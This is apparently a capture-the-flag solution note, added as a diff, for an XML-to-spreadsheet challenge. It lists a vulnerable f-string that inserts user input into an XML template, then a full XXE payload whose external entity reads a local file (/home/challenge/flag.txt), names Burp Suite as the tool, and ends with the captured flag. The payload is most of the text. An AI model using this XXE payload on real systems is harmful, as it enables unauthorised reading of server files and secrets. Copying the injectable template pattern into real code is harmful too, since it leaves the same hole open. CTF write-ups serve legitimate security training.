@@ -1,0 +1,26 @@
+XML REF: https://www.w3schools.com/xml/xml_server.asp
+CODE EXECUTION REF: https://security.snyk.io/vuln/SNYK-PYTHON-XML2XLSX-5881344
+
+
+VULNERABLE CODE:
+    template_xml = f'<!--?xml version="1.0" ?--> {new_repo}'
+
+
+PAYLOAD:
+
+    <!DOCTYPE flag_snyk [<!ENTITY external_access SYSTEM "file:////home/challenge/flag.txt"> ]>
+    <sheet title="Dream Sheets">  
+        <row><cell>Bed Size</cell><cell>&external_access;</cell></row> 
+        <row><cell>Color</cell><cell>#f00000</cell></row> 
+        <row><cell>Thread Count</cell><cell>500</cell></row>
+        <row><cell>Quantity</cell><cell>9999</cell></row>
+    </sheet>
+
+
+TOOL:
+
+    BURPSUITE
+
+FLAG:
+
+    flag{ea0b5b46432606a60d3936fc89b9488d}
